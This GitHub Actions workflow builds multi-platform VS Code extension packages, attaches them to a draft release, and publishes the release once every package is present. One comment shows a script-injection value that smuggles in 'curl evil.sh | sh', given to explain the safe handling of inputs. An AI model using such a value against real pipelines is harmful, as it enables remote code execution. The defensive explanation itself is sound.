# Builds the Workflow Insight Explorer VS Code extension for each supported
# platform/arch, creates a DRAFT GitHub Release, attaches all 4 platform
# .vsix files to it, then publishes the release as the final step. This
# extension is not published to npm (it's "private": true) or, during
# preview, to the VS Code Marketplace — see
# packages/aws-durable-execution-sdk-js-insight-vscode/README.md.
# Testers/customers install it by downloading the .vsix matching their
# platform from the release and side-loading it with
# `code --install-extension`.
#
# Multiple platform-specific .vsix files are required because the bundled
# local (on-device) LLM provider depends on node-llama-cpp, which ships
# native prebuilt binaries per OS/arch. `vsce package --target <target>` must
# run on a matching host so npm resolves that target's binary via
# optionalDependencies — there is no cross-compiling this from one runner.
#
# --- Why workflow_dispatch instead of `on: release: published` ---
# This repo has GitHub's immutable-releases protection enabled: once a
# release is published, its assets can no longer be added, changed, or
# removed (HTTP 422 "Cannot upload assets to an immutable release"). A
# `release: published` trigger fires only AFTER the release is already
# published — too late to attach anything.
# GitHub's own docs recommend the fix: create the release as a DRAFT, attach
# every asset while it's still a draft, then publish it last. But `release`
# events are explicitly NOT sent for draft-related activity (per GitHub's
# events-that-trigger-workflows docs: "Workflows are not triggered for the
# created, edited, or deleted activity types for draft releases"), so no
# `release`-event trigger can drive this. workflow_dispatch (a manual/scripted
# trigger, run BEFORE any release or tag exists) is the only way to run this
# sequence in the right order.

name: vscode extension release

permissions:
  contents: read

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release (must exactly match packages/aws-durable-execution-sdk-js-insight-vscode/package.json's version on the ref you're running this from). The release tag will be workflow-insight-vscode-v<version>."
        required: true
        type: string

env:
  # The desktop app's `electron` devDependency has an install script that
  # downloads a ~100 MB platform binary. Root `npm ci` runs it, and CI runs root
  # `npm ci` across roughly eight jobs per PR — none of which launch Electron
  # (the desktop tests are pure: assetPath.test.ts imports only node:path, and
  # the bundle step needs no runtime). Skip the download; anyone who needs the
  # binary locally gets it from a normal `npm install`, or `npm rebuild electron`.
  ELECTRON_SKIP_BINARY_DOWNLOAD: "1"

jobs:
  check-version:
    runs-on: ubuntu-latest
    outputs:
      vsix_version: ${{ steps.check.outputs.vsix_version }}
      tag_name: ${{ steps.check.outputs.tag_name }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: check
        env:
          # Untrusted workflow_dispatch input — must go through an
          # intermediate environment variable, not be interpolated directly
          # into the run: script, per GitHub's script-injection guidance
          # (https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable).
          # A malicious version value like `0.1.0"; curl evil.sh | sh; #`
          # would otherwise be spliced into the generated shell script
          # before bash ever parses it — the "$INPUT_VERSION" quoting below
          # does NOT protect against this, since the substitution happens
          # at the YAML-templating stage, not inside the shell.
          INPUT_VERSION: ${{ inputs.version }}
        run: |
          set -euo pipefail
          PKG_VERSION=$(node -p "require('./packages/aws-durable-execution-sdk-js-insight-vscode/package.json').version")
          if [[ "$INPUT_VERSION" != "$PKG_VERSION" ]]; then
            echo "Input version '$INPUT_VERSION' does not match package.json version '$PKG_VERSION' on this ref. Aborting before creating any release."
            exit 1
          fi
          echo "vsix_version=$PKG_VERSION" >> "$GITHUB_OUTPUT"
          echo "tag_name=workflow-insight-vscode-v${PKG_VERSION}" >> "$GITHUB_OUTPUT"

  create-draft-release:
    needs: [check-version]
    runs-on: ubuntu-latest
    permissions:
      contents: write # required to create the draft release
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Create draft release (or reuse an existing one for this tag)
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ needs.check-version.outputs.tag_name }}
          REPO: ${{ github.repository }}
          VSIX_VERSION: ${{ needs.check-version.outputs.vsix_version }}
        run: |
          set -euo pipefail
          if gh release view "$TAG" --repo "$REPO" >/dev/null 2>&1; then
            IS_DRAFT=$(gh release view "$TAG" --repo "$REPO" --json isDraft --jq '.isDraft')
            if [[ "$IS_DRAFT" != "true" ]]; then
              echo "Release '$TAG' already exists and is already published (not a draft) — refusing to touch it. Bump the version to release again."
              exit 1
            fi
            echo "Draft release '$TAG' already exists; reusing it."
          else
            gh release create "$TAG" --repo "$REPO" \
              --title "Workflow Insight Explorer ${VSIX_VERSION} (Preview)" \
              --notes "Preview build — multi-platform .vsix release. Includes darwin-arm64, win32-x64, win32-arm64, and linux-x64 builds with on-device LLM support." \
              --draft
          fi

  build-and-attach:
    needs: [check-version, create-draft-release]
    strategy:
      fail-fast: false
      matrix:
        include:
          # node-llama-cpp ships native prebuilt binaries per OS/arch (resolved
          # by npm via optionalDependencies at install time based on the HOST
          # platform) — so each target's .vsix must be built on a runner that
          # actually matches that target; there is no cross-compiling this.
          - target: darwin-arm64
            os: macos-14
          - target: win32-x64
            os: windows-latest
          - target: win32-arm64
            os: windows-11-arm
          - target: linux-x64
            os: ubuntu-latest
    runs-on: ${{ matrix.os }}
    permissions:
      contents: write # required to upload a release asset
    defaults:
      run:
        working-directory: packages/aws-durable-execution-sdk-js-insight-vscode
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
      - name: Install root dependencies
        # --ignore-scripts avoids the repo-root "prepare" script (husky
        # install), which can fail on a fresh CI checkout (observed:
        # "sh: husky: command not found", exit 127) — likely a PATH-timing
        # issue with npm's lifecycle-script execution, not anything this
        # job needs. Git hooks are irrelevant in CI, and nothing below
        # (typecheck, test, or the isolated packaging step) depends on any
        # other root-level lifecycle script.
        run: npm ci --ignore-scripts
      - name: Install webview-ui dependencies
        # webview-ui is a nested package outside the root workspaces glob
        # (packages/*), so it needs its own explicit install.
        working-directory: packages/aws-durable-execution-sdk-js-insight-vscode/webview-ui
        run: npm ci
      - run: npm run typecheck
      - run: npm run test
      - name: Package (${{ matrix.target }}) in an isolated (non-workspace) copy
        # `vsce package` cannot run correctly from inside this npm workspace:
        # - npm hoists node-llama-cpp's resolved per-platform native binary
        #   (@node-llama-cpp/<platform>) to the repo-root node_modules/, but
        #   vsce/VS Code require a self-contained package directory.
        # - vsce's dependency walk also picks up sibling workspace packages
        #   via `../` and fails outright (`invalid relative path`).
        # Isolating a copy of just this package (with its own standalone
        # `npm install --no-workspaces`) outside the workspace tree avoids
        # both problems — this is the standard workaround for vsce +
        # npm/yarn workspaces (see microsoft/vscode-vsce#471, #581).
        shell: bash
        run: |
          set -euo pipefail
          # Don't build the isolation/copy-back paths from $RUNNER_TEMP or
          # $GITHUB_WORKSPACE directly: on Windows runners those are native
          # Windows-style strings (e.g. D:\a\_temp), and passing them through
          # Git Bash into a real Windows binary like tar.exe has repeatedly
          # been observed to mangle them (colons/backslashes double-escaped,
          # producing a path tar can't open — this matches a known class of
          # GitHub Actions Windows+bash issues, e.g. actions/runner#1328).
          # mktemp -d and `pwd` are pure bash/coreutils operations that stay
          # entirely within Git Bash's own POSIX-path view of the
          # filesystem, so the string never has to round-trip through a
          # native Windows path representation.
          WORKSPACE_DIR="$(pwd)"
          ISOLATED="$(mktemp -d)"
          # Portable copy (avoids relying on rsync, which isn't preinstalled
          # on Windows runners): tar streamed through a pipe, excluding
          # directories we don't want carried into the isolated copy.
          tar --exclude='./node_modules' --exclude='./vsix' --exclude='./dist' \
            --exclude='./webview-ui/node_modules' --exclude='./webview-ui/dist' \
            -cf - . | tar -xf - -C "$ISOLATED"
          cd "$ISOLATED"
          # Run node-llama-cpp's postinstall (i.e. don't pass --ignore-scripts)
          # so binary resolution happens deterministically here, matching
          # node-llama-cpp's own documented recommendation ("allow scripts...
          # to ensure resolving the binaries happens during npm install,
          # instead of on the first time of calling getLlama"). As of the npm
          # version pinned above, install scripts still run by default (the
          # package.json "allowScripts" allow-list is advisory-only in this
          # npm release per `npm help approve-scripts`; a future npm release
          # is expected to enforce it, at which point this step may need an
          # explicit allow-list entry for node-llama-cpp).
          #
          # The getLlama() smoke test below is the real guardrail: it fails
          # the build if this platform's native binary didn't resolve,
          # instead of silently shipping a .vsix that would only fail for an
          # end user on first use of the local (on-device) LLM provider.
          # Stage the private, unpublished workspace packages this extension
          # depends on. Without this, `npm install --no-workspaces` tries to
          # resolve @aws/durable-execution-sdk-js-insight-core from the public registry and fails
          # with E404 -- that package is `"private": true` and is never
          # published. This workflow is workflow_dispatch-only, so PR checks do
          # not exercise it; src/packaging.test.ts asserts every private
          # dependency is staged here and fails in normal CI if one is added
          # without being listed below.
          #
          # A packed tarball, not a `file:<dir>` spec: npm treats a directory
          # spec as a LINK (like npm link) and does not install the linked
          # package's own dependencies, so core's 16 AWS SDK deps would be
          # missing and esbuild would fail to resolve them. Installing from a
          # tarball pulls the full dependency tree, which the bundle needs.
          for PRIVATE_DEP in aws-durable-execution-sdk-js-insight-core; do
            TGZ="$(cd "$WORKSPACE_DIR/../$PRIVATE_DEP" && npm pack --pack-destination "$ISOLATED" | tail -1)"
            DEP_NAME="$(node -p "require('$WORKSPACE_DIR/../$PRIVATE_DEP/package.json').name")"
            npm pkg set "dependencies.$DEP_NAME=file:./$TGZ"
          done
          npm install --no-workspaces
          test -d node_modules/node-llama-cpp || { echo "node-llama-cpp did not install"; exit 1; }
          node --input-type=module -e "
            import('node-llama-cpp').then(({getLlama}) => getLlama())
              .then(() => console.log('getLlama() resolved OK'))
              .catch(e => { console.error('getLlama() failed:', e.message); process.exit(1); });
          "
          # npm's optionalDependencies resolution installs every
          # @node-llama-cpp/<variant> package valid for this OS/arch — for
          # x64 that's 4 variants (base, cuda, cuda-ext, vulkan), all
          # bundled into node_modules side by side (npm doesn't know this
          # extension only needs one). Left unpruned, this bloats the .vsix
          # by ~400MB+ on x64 targets with CUDA/Vulkan binaries that only
          # matter for GPU-accelerated inference — out of scope for this
          # extension's actual usage (occasional NL queries, not heavy local
          # inference), so we keep the on-device provider CPU-only and prune
          # every other installed variant before packaging. Also prunes
          # node-llama-cpp's own build-tooling: gitRelease.bundle (a ~30MB
          # git bundle used only by its from-source build fallback) and any
          # llama.cpp/localBuilds directories from an actual from-source
          # build — none of this is needed once a prebuilt binary variant
          # is in place (confirmed by the getLlama() checks before and
          # after pruning below).
          case "$VSCE_TARGET" in
            darwin-arm64) KEEP_VARIANT="mac-arm64-metal" ;;
            win32-x64)    KEEP_VARIANT="win-x64" ;;
            win32-arm64)  KEEP_VARIANT="win-arm64" ;;
            linux-x64)    KEEP_VARIANT="linux-x64" ;;
            *) echo "No @node-llama-cpp variant mapping for target '$VSCE_TARGET'"; exit 1 ;;
          esac
          for dir in node_modules/@node-llama-cpp/*/; do
            variant="$(basename "$dir")"
            if [ "$variant" != "$KEEP_VARIANT" ]; then
              rm -rf "$dir"
            fi
          done
          rm -rf node_modules/node-llama-cpp/llama/llama.cpp
          rm -rf node_modules/node-llama-cpp/llama/localBuilds
          rm -f node_modules/node-llama-cpp/llama/gitRelease.bundle
          # Re-verify getLlama() still resolves after pruning, so a wrong
          # KEEP_VARIANT mapping (or an unexpected extra prune) fails the
          # build here instead of silently shipping a broken .vsix.
          node --input-type=module -e "
            import('node-llama-cpp').then(({getLlama}) => getLlama())
              .then(() => console.log('getLlama() still resolves after pruning'))
              .catch(e => { console.error('getLlama() failed after pruning:', e.message); process.exit(1); });
          "
          # This getLlama() call has been observed to itself recreate
          # llama.cpp/localBuilds/gitRelease.bundle on at least one runner
          # (ubuntu-latest/linux-x64) even though the prebuilt binary is
          # present and getLlama() succeeds both before and after — some
          # internal check in node-llama-cpp re-triggers a redundant
          # from-source build after the other @node-llama-cpp/* variant
          # directories are removed. The prebuilt binary still works
          # correctly (confirmed by this call succeeding), so this isn't a
          # real failure — just unpruned build byproduct. Sweep once more,
          # right before packaging, to remove anything this call created.
          rm -rf node_modules/node-llama-cpp/llama/llama.cpp
          rm -rf node_modules/node-llama-cpp/llama/localBuilds
          rm -f node_modules/node-llama-cpp/llama/gitRelease.bundle
          (cd webview-ui && npm ci)
          # Not `npm run package:target`: npm spawns cmd.exe (not bash) to
          # execute package.json scripts on Windows by default (this is
          # npm's own documented behavior — see "npm run" docs), so the
          # POSIX syntax in that script ($VSCE_TARGET, $(...)) was being
          # passed to vsce as literal, unexpanded text on the Windows legs.
          # Invoking vsce directly here keeps it inside the shell this step
          # already declared (Git Bash), where that syntax works correctly
          # — verified by the get-Llama() check above succeeding on the
          # same runner just before this line.
          # One more sweep immediately before packaging: cheap insurance
          # against any of the above steps (webview-ui's own npm ci, etc.)
          # unexpectedly re-triggering node-llama-cpp's postinstall/build
          # path again.
          rm -rf node_modules/node-llama-cpp/llama/llama.cpp
          rm -rf node_modules/node-llama-cpp/llama/localBuilds
          rm -f node_modules/node-llama-cpp/llama/gitRelease.bundle
          mkdir -p vsix
          PKG_VERSION=$(node -p "require('./package.json').version")
          npx --yes @vscode/vsce@3.9.2 package --target "$VSCE_TARGET" \
            --out "vsix/aws-durable-execution-sdk-js-insight-vscode-${PKG_VERSION}-${VSCE_TARGET}.vsix"
          mkdir -p "$WORKSPACE_DIR/vsix"
          cp vsix/*.vsix "$WORKSPACE_DIR/vsix/"
        env:
          VSCE_TARGET: ${{ matrix.target }}
      - name: Upload .vsix to draft release
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ needs.check-version.outputs.tag_name }}
          REPO: ${{ github.repository }}
        shell: bash
        run: |
          gh release upload "$TAG" vsix/*.vsix --clobber --repo "$REPO"

  verify-and-publish:
    needs: [check-version, build-and-attach]
    # !cancelled() (not the implicit if: success()) is required here: with
    # strategy.fail-fast: false, a single matrix leg failing still marks the
    # whole build-and-attach job as failed overall, and a downstream job that
    # only `needs` a failed job is skipped by default — meaning this
    # verification would never run in exactly the scenario it exists to
    # catch (a partial release with some platforms missing).
    #
    # needs.check-version.result == 'success' is also required: without it,
    # a failure in check-version itself (e.g. version mismatch) skips
    # create-draft-release and build-and-attach, but !cancelled() alone
    # would still let this job run with empty TAG/VER outputs — turning one
    # clean, expected failure (bad version input) into a second, confusing
    # "release not found" error instead of a clean skip.
    if: ${{ !cancelled() && needs.check-version.result == 'success' }}
    runs-on: ubuntu-latest
    permissions:
      contents: write # required to publish the release
    steps:
      - name: Confirm all 4 platform .vsix files are attached, then publish
        # Only publish once every expected asset is present — this is what
        # keeps the draft-first design safe: nothing becomes immutable until
        # this check passes. If anything is missing, the release is left as
        # a draft (not immutable, not visible to normal users) so the run
        # can be fixed and re-triggered without any cleanup.
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ needs.check-version.outputs.tag_name }}
          REPO: ${{ github.repository }}
          VER: ${{ needs.check-version.outputs.vsix_version }}
        shell: bash
        run: |
          set -euo pipefail
          ASSETS=$(gh release view "$TAG" --repo "$REPO" --json assets --jq '.assets[].name')
          MISSING=0
          for target in darwin-arm64 win32-x64 win32-arm64 linux-x64; do
            EXPECTED="aws-durable-execution-sdk-js-insight-vscode-${VER}-${target}.vsix"
            if echo "$ASSETS" | grep -qxF "$EXPECTED"; then
              echo "OK: $EXPECTED present"
            else
              echo "MISSING: $EXPECTED"
              MISSING=1
            fi
          done
          if [ "$MISSING" -ne 0 ]; then
            echo "One or more platform .vsix files are missing from draft release '$TAG'. Leaving it as a draft — re-run this workflow after fixing the failing leg(s)."
            exit 1
          fi
          echo "All 4 platform .vsix files present. Publishing release '$TAG'."
          gh release edit "$TAG" --repo "$REPO" --draft=false
